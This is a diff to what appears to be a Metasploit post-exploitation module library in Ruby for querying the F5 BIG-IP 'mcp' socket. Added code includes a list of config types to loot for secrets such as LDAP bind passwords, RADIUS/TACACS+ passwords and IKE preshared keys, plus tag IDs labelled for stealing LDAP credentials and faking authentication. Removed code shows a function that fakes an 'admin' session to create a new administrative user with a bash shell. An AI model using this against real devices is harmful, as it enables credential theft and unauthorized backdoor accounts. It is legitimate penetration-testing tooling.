@@ -1,5 +1,30 @@
 # Encoding: ASCII-8BIT
 
+# TODO: Possibly query these:
+# request_audit
+# vlan
+# interface
+# platform
+# monitor_param
+# monitor
+# rule
+# rule_event
+# profile_auth
+# system_information
+# master_key
+# aaa_*
+# sys_device
+# smtp_config
+# auth_ldap_config - can get the AD password
+# radius_server - can get radius password
+# auth_tacacs_config - can get tacacs+ password
+# ike_peer - ike_peer_preshared_key
+# A couple db_variables have secrets
+# smtp_config - password
+# app_cloud_security_service - access keys
+
+# packet_filter_allow_trusted?
+
 module Msf
   class Post
     module Linux
@@ -74,6 +99,16 @@ module Msf
           'userdb_entry_transaction_id' => 0x5116,
           'userdb_entry_session_limit' => 0xa081,
 
+          # User roles
+          'user_role_partition' => 0x1004,
+          'user_role_partition_partition' => 0x1008,
+          'user_role_partition_user' => 0x1006,
+          'user_role_partition_role' => 0x1007,
+
+          # Used to fake authentication to make changes
+          'user_authenticated' => 0x1028,
+          'user_authenticated_name' => 0x1029,
+
           # Database variable types
           'db_variable' => 0x084a,
           'db_variable_name' => 0x084b,
@@ -100,16 +135,63 @@ module Msf
           'db_variable_app_id' => 0x2875,
           'db_variable_strict_app_updates' => 0x2876,
 
+          # Transaction stuff
           'start_transaction' => 0x0b6c,
           'start_transaction_reset_level' => 0x0b6d,
           'end_transaction' => 0x0b6e,
-          'user_role_partition' => 0x1004,
-          'user_role_partition_partition' => 0x1008,
-          'user_role_partition_user' => 0x1006,
-          'user_role_partition_role' => 0x1007,
-          'user_authenticated' => 0x1028,
-          'user_authenticated_name' => 0x1029,
           'start_transaction_load_type' => 0x253e,
+
+          # Stealing LDAP credentials
+          'auth_ldap_config' => 0x069a,
+          'auth_ldap_config_name' => 0x069b,
+          'auth_ldap_config_debug' => 0x069c,
+          'auth_ldap_config_ignore_authinfo_unavail' => 0x069d,
+          'auth_ldap_config_ignore_unknown_user' => 0x069e,
+          'auth_ldap_config_warnings' => 0x069f,
+          'auth_ldap_config_try_first_pass' => 0x06a0,
+          'auth_ldap_config_use_first_pass' => 0x06a1,
+          'auth_ldap_config_servers' => 0x06a2,
+          'auth_ldap_config_port' => 0x06a3,
+          'auth_ldap_config_ssl' => 0x06a4,
+          'auth_ldap_config_ssl_check_peer' => 0x06a5,
+          'auth_ldap_config_ssl_cacertfile' => 0x06a6,
+          'auth_ldap_config_ssl_ciphers' => 0x06a7,
+          'auth_ldap_config_ssl_clientkey' => 0x06a8,
+          'auth_ldap_config_ssl_clientcert' => 0x06a9,
+          'auth_ldap_config_search_base_dn' => 0x06aa,
+          'auth_ldap_config_version' => 0x06ab,
+          'auth_ldap_config_bind_dn' => 0x06ac,
+          'auth_ldap_config_bind_pw' => 0x06ad,
+          'auth_ldap_config_scope' => 0x06ae,
+          'auth_ldap_config_search_timelimit' => 0x06af,
+          'auth_ldap_config_bind_timelimit' => 0x06b0,
+          'auth_ldap_config_idle_timelimit' => 0x06b1,
+          'auth_ldap_config_filter' => 0x06b2,
+          'auth_ldap_config_login_attribute' => 0x06b3,
+          'auth_ldap_config_check_host_attr' => 0x06b4,
+          'auth_ldap_config_group_dn' => 0x06b5,
+          'auth_ldap_config_group_member_attr' => 0x06b6,
+          'auth_ldap_config_template_login_attribute' => 0x06b7,
+          'auth_ldap_config_template_login' => 0x06b8,
+          'auth_ldap_config_password_encoding' => 0x06b9,
+          'auth_ldap_config_is_system' => 0x06ba,
+          'auth_ldap_config_mark' => 0x06bb,
+          'auth_ldap_config_dirty_cnt' => 0x06bc,
+          'auth_ldap_config_object_id' => 0x06bd,
+          'auth_ldap_config_attributes' => 0x06be,
+          'auth_ldap_config_validate_checkpoint' => 0x06bf,
+          'auth_ldap_config_validate_commit' => 0x06c0,
+          'auth_ldap_config_usertemplate' => 0x0d5d,
+          'auth_ldap_config_partition_id' => 0x1057,
+          'auth_ldap_config_transaction_id' => 0x111b,
+          'auth_ldap_config_description' => 0x280a,
+          'auth_ldap_config_leaf_name' => 0x280b,
+          'auth_ldap_config_folder_name' => 0x280c,
+          'auth_ldap_config_app_id' => 0x280d,
+          'auth_ldap_config_strict_app_updates' => 0x280e,
+          'auth_ldap_config_check_roles_group' => 0x39ee,
+          'auth_ldap_config_referrals' => 0x9d4f,
+          'auth_ldap_config_include' => 0x9f80,
         }
 
         TAGS_BY_ID = TAGS_BY_NAME.invert()
@@ -148,9 +230,19 @@ module Msf
 
           # Sometimes, the service doesn't respond with a complete packet, but
           # instead truncates it. This only seems to happen on very long replies,
-          # but we have a small loop here to try and compensate for that
+          # and seems to happen ~50% of the time, so running this loop 5 times
+          # gives a pretty high chance of it working
           #
-          # This is the best we can do without having access to an AF_UNIX
+          # This isn't a problem with Metasploit, it even happens when I use
+          # socat directly.. I think it's just because we don't have AF_UNIX.
+          # In this example, 559604 is right and 548160 is truncated:
+          #
+          # # echo 'AAAAEAAAAAAAAAAAAAAAAAtlAA0AAAAICEoADQAAAAA=' | base64 -d | socat -t100 - UNIX-CONNECT:/var/run/mcp | wc -c
+          # 559604
+          # # echo 'AAAAEAAAAAAAAAAAAAAAAAtlAA0AAAAICEoADQAAAAA=' | base64 -d | socat -t100 - UNIX-CONNECT:/var/run/mcp | wc -c
+          # 548160
+          #
+          # This loop is the best we can do without having access to an AF_UNIX
           # socket (or doing something much, much more complex)
           replies = []
           0.upto(4) do
@@ -167,7 +259,7 @@ module Msf
             # that long
             expected_length = incoming_data.unpack('N').pop
             if incoming_data.length < expected_length
-              vprint_warning("mcp responded with #{packet.length} bytes instead of the promised #{expected_length} bytes! Trying again...")
+              vprint_warning("mcp responded with #{incoming_data.length} bytes instead of the promised #{expected_length} bytes! Trying again...")
             else
               return mcp_parse_responses(incoming_data)
             end
@@ -273,16 +365,62 @@ module Msf
                   value: "Array data: #{array.unpack('H*').pop}"
                 }
               else
-                raise "Unknown type: #{ type }"
-                return
+                raise "Tried to parse unknown mcp type (skipping): #{ type }"
               end
             end
           rescue StandardError => e
-            print_error(e.message)
-            return nil
+            # If we fail somewhere, print a warning but return what we have
+            print_warning(e.message)
           end
 
           result
+        end
+
+        # Pull a single value out of a tag/value structure (ie, the thing
+        # returned by mcp_parse()). The result is:
+        #
+        # * If there are no values with that tag name, return nil
+        # * If there's a single value with that tag name, return it
+        # * If there are multiple values with that tag name, print an error
+        #   and return nil
+        def mcp_get_single(h, name)
+          # Get all the entries
+          entries = mcp_get_multiple(h, name)
+
+          if entries.empty?
+            # If there are none, return nil
+            return nil
+          elsif entries.length == 1
+            # If there's one, return it
+            return entries.pop
+          else
+            # If there are multiple entries, print a warning and return nil
+            print_warning("Query for mcp type #{name} was supposed to have one response but had #{entries.length}")
+            return nil
+          end
+
+        end
+
+        # Pull an array of tags with the same name out of a tag/value structure.
+        # For example, when you perform a query for `userdb_entry`, it returns
+        # multiple tags with the same name.
+        #
+        # The result is:
+        # * If there are no values, return an empty array
+        # * If there are one or more values, return them as an array
+        def mcp_get_multiple(h, name)
+          h.select { |entry| entry[:tag] == name }.map { |entry| entry[:value] }
+        end
+
+        # Take an array of results from an mcp query, and change them from
+        # an array of tag=>value into a hash.
+        #
+        # Note! If there are multiple fields with the same tag, this will
+        # only return one of them!
+        def mcp_to_h(a)
+          a.map do |r|
+            [r[:tag], r[:value]]
+          end.to_h
         end
 
         # Build an mcp message
@@ -335,7 +473,7 @@ module Msf
         # Attempts to abstract away all the messiness in the protocol, instead
         # we just query for a type and get all the responses as an array of
         # hashes
-        def mcp_query_one(querytype)
+        def mcp_simple_query(querytype)
           # Get the raw result
           result = mcp_send_recv([
             mcp_build('query_all', 'structure', [
@@ -343,123 +481,36 @@ module Msf
             ])
           ])
 
+          # Error handling
           unless result
             print_error("mcp_send_recv failed")
             return nil
           end
 
-          if result.length == 0
-            print_error("mcp_send_recv query returned no results")
+          # Sanity check - we only expect one result
+          if result.length != 1
+            print_error("mcp_send_recv query was supposed to return one result, but returned #{result.length} results instead")
             return nil
           end
-
-          if result.length > 1
-            print_error("mcp_send_recv query returned multiple results")
-            return nil
-          end
-
-          # The only result we want is `query_reply` - ignore others that
-          # can be potentially included (such as partition info)
-          result = result.pop.select { |r| r[:tag] == 'query_reply' }
-
-          # Make sure we have a reply
-          unless result.length
-            print_error("Invalid response returned by mcp: no query_reply")
-            return nil
-          end
-
-          if result.length > 1
-            print_error("Invalid response returned by mcp: more than one query_reply")
-            return nil
-          end
+          # Get that result
           result = result.pop
 
-          # We only care about the response
-          result = result[:value]
+          # Get the reply
+          result = mcp_get_single(result, 'query_reply')
+          if result.nil?
+            print_error("mcp didn't return a query_reply to our query")
+            return nil
+          end
 
-          # Structure it into a more sensible format
+          # Get all the fields for the querytype
+          result = mcp_get_multiple(result, querytype)
+
+          # Convert each result to a hash
           result = result.map do |single_result|
-            single_result[:value].map do |r|
-              [r[:tag], r[:value]]
-            end.to_h
+            mcp_to_h(single_result)
           end
 
           result
-        end
-
-        # Query the mcp socket for a list of users
-        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
-        def mcp_query_all_users()
-          mcp_query_one('userdb_entry')
-        end
-
-        # Query the mcp socket for a list of users
-        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
-        def mcp_query_all_db_variables()
-          mcp_query_one('db_variable')
-        end
-
-        # Create an administrative user
-        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb
-        def mcp_create_user(username, password)
-          unless password =~ /^$/
-            vprint_status("Hashing the password")
-            salt = "$6$#{Rex::Text.rand_text_alphanumeric(8)}$"
-            password = password.crypt(salt)
-
-            if !password || password.empty?
-              print_error('Failed to crypt the password')
-              return nil
-            end
-          end
-
-          # These requests have to go in a single "session", which, to us, is
-          # a single packet (since we don't have AF_UNIX sockets)
-          result = mcp_send_recv([
-            # Authenticate as "admin"
-            mcp_build('user_authenticated', 'structure', [
-              mcp_build('user_authenticated_name', 'string', 'admin')
-            ]),
-
-            # Start transaction
-            mcp_build('start_transaction', 'structure', [
-              mcp_build('start_transaction_load_type', 'ulong', 0)
-            ]),
-
-            # Create the role mapping
-            mcp_build('create', 'structure', [
-              mcp_build('user_role_partition', 'structure', [
-                mcp_build('user_role_partition_user', 'string', username),
-                mcp_build('user_role_partition_role', 'ulong',  0),
-                mcp_build('user_role_partition_partition', 'string', '[All]'),
-              ])
-            ]),
-
-            # Create the userdb entry
-            mcp_build('create', 'structure', [
-              mcp_build('userdb_entry', 'structure', [
-                mcp_build('userdb_entry_name',         'string', username),
-                mcp_build('userdb_entry_partition_id', 'string', 'Common'),
-                mcp_build('userdb_entry_is_system',    'ulong',  0),
-                mcp_build('userdb_entry_shell',        'string', '/bin/bash'),
-                mcp_build('userdb_entry_is_crypted',   'ulong',  1),
-                mcp_build('userdb_entry_passwd',       'string', password),
-              ])
-            ]),
-
-            # Finish the transaction
-            mcp_build('end_transaction', 'structure', [])
-          ])
-
-          result.each do |r|
-            # Look for a tag called "result_message" in the response
-            msg = r[0][:value].select { |r2| r2[:tag] == 'result_message' }
-
-            # If it exists, warn the user
-            if !msg.empty?
-              print_warning("Server returned: #{msg.pop[:value]}")
-            end
-          end
         end
       end
     end
